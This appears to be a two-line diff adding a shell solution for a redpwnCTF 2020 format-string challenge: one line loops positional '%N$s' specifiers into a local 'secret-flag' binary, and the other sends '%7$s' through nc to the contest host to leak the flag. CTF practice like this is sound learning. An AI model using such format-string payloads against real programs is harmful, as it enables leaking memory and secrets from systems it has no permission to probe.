@@ -1,0 +1,2 @@
+for i in `seq 1 100`; do echo "%$i\$s" | ./secret-flag; done
+echo "%7\$s" | nc 2020.redpwnc.tf 31826
